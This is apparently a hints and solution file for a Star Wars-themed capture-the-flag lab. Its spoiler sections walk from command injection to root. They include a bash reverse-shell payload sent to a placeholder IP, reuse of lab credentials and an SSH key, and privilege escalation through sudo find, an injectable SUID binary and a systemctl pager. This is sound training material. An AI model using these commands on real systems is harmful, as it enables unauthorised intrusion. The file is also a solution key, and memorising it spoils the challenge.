# Death Star Leak - Hints System

Use these hints if you get stuck. Try to solve as much as possible on your own first!

---

## 🎯 Initial Access Hints

### Hint 1 (Very Easy)
<details>
<summary>Click to reveal</summary>

Have you explored the web application thoroughly? Check for any debug or development features.

</details>

### Hint 2 (Easy)
<details>
<summary>Click to reveal</summary>

Try adding `?debug=true` to the URL and experiment with the `id` parameter.

</details>

### Hint 3 (Medium)
<details>
<summary>Click to reveal</summary>

The application is vulnerable to command injection. Try using shell metacharacters like `;`, `|`, or `&&` in the `id` parameter.

Example: `?id=test; whoami&debug=true`

</details>

### Hint 4 (Solution)
<details>
<summary>Click to reveal</summary>

Use command injection to get a reverse shell:
```
?id=test; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'&debug=true
```

URL encode the special characters and set up a netcat listener first: `nc -lvnp 4444`

</details>

---

## 🎖️ Stormtrooper (TK-421) Hints

### Hint 1 (Easy)
<details>
<summary>Click to reveal</summary>

Look for readable files in the stormtrooper's home directory. Imperial personnel often leave notes lying around.

</details>

### Hint 2 (Medium)
<details>
<summary>Click to reveal</summary>

Check `/home/stormtrooper/message.txt` - it contains communication logs with credentials.

</details>

### Hint 3 (Solution)
<details>
<summary>Click to reveal</summary>

Credentials found in message.txt:
- Username: `stormtrooper`
- Password: `tk421isdown`

SSH into the box: `ssh stormtrooper@<target_ip>`

</details>

---

## 👮 Imperial Officer Hints

### Hint 1 (Easy)
<details>
<summary>Click to reveal</summary>

Stormtroopers sometimes keep backups of important files. Check for hidden directories in the stormtrooper's home.

</details>

### Hint 2 (Medium)
<details>
<summary>Click to reveal</summary>

Look in `/home/stormtrooper/.backup/` - there's an SSH private key for the imperial-officer.

</details>

### Hint 3 (Solution)
<details>
<summary>Click to reveal</summary>

Copy the SSH key:
```bash
cat /home/stormtrooper/.backup/officer_key > /tmp/key
chmod 600 /tmp/key
ssh -i /tmp/key imperial-officer@localhost
```

</details>

---

## ⭐ Commander (Tarkin) Hints

### Hint 1 (Easy)
<details>
<summary>Click to reveal</summary>

Check what sudo privileges the imperial-officer has: `sudo -l`

</details>

### Hint 2 (Medium)
<details>
<summary>Click to reveal</summary>

The imperial-officer can run `/usr/bin/find` as the commander user. The find command can execute other commands!

</details>

### Hint 3 (Hard)
<details>
<summary>Click to reveal</summary>

Use find's `-exec` parameter to execute a shell:
```bash
sudo -u commander /usr/bin/find . -exec /bin/bash \;
```

</details>

### Hint 4 (Solution)
<details>
<summary>Click to reveal</summary>

Full command:
```bash
sudo -u commander /usr/bin/find /home/commander -type f -exec /bin/bash \;
```

You can also use: `sudo -u commander /usr/bin/find . -exec /bin/sh -p \;`

</details>

---

## ⚫ Darth Vader Hints

### Hint 1 (Easy)
<details>
<summary>Click to reveal</summary>

Look for SUID binaries on the system. These run with the permissions of their owner, not the user executing them.

Command: `find / -perm -4000 -type f 2>/dev/null`

</details>

### Hint 2 (Medium)
<details>
<summary>Click to reveal</summary>

There's a custom binary `/usr/local/bin/deathstar_scanner` owned by vader with the SUID bit set.

</details>

### Hint 3 (Hard)
<details>
<summary>Click to reveal</summary>

The deathstar_scanner binary is vulnerable to command injection. It doesn't properly sanitize input before passing it to `system()`.

Try: `/usr/local/bin/deathstar_scanner "test; whoami"`

</details>

### Hint 4 (Solution)
<details>
<summary>Click to reveal</summary>

Exploit the command injection to spawn a shell:
```bash
/usr/local/bin/deathstar_scanner "test; /bin/bash -p"
```

The `-p` flag preserves the SUID permissions, giving you a vader shell.

</details>

---

## 👑 Emperor (Root) Hints

### Hint 1 (Easy)
<details>
<summary>Click to reveal</summary>

Check vader's sudo privileges: `sudo -l`

</details>

### Hint 2 (Medium)
<details>
<summary>Click to reveal</summary>

Vader can run `/bin/systemctl status` as root. When systemctl displays output, it uses a pager like `less` or `more`.

</details>

### Hint 3 (Hard)
<details>
<summary>Click to reveal</summary>

Pagers like `less` allow command execution! When you see the `:` prompt at the bottom, you can type `!` followed by a command.

</details>

### Hint 4 (Solution)
<details>
<summary>Click to reveal</summary>

Steps to root:
1. Run: `sudo /bin/systemctl status apache2`
2. When the pager opens (you see `:` at the bottom), type: `!/bin/bash`
3. Press Enter
4. You now have a root shell!

Alternative: `sudo systemctl status` (without specifying a service shows all services)

</details>

---

## 🎓 General CTF Tips

### Enumeration is Key
- Always run `id`, `whoami`, `sudo -l`, `ls -la` when you get a new shell
- Check home directories: `ls -la /home`
- Look for readable files: `find / -readable -type f 2>/dev/null | grep -v proc`

### SUID Binaries
- Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
- Check [GTFOBins](https://gtfobins.github.io/) for exploitation techniques

### Sudo Abuse
- Always check: `sudo -l`
- Reference GTFOBins for sudo escalation methods

### File Permissions
- World-readable files might contain sensitive info
- Check `.backup`, `.ssh`, `.config` directories

### SSH Keys
- Private keys in `~/.ssh/id_rsa` can be used to authenticate as that user
- Keys might be stored in backup locations

---

## 📚 External Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited for privilege escalation
- [HackTricks](https://book.hacktricks.xyz/) - Comprehensive pentesting guide
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Useful payloads and bypasses
- [Linux Privilege Escalation](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md) - Escalation checklist

---

May the Force guide you through the challenge! 🌟
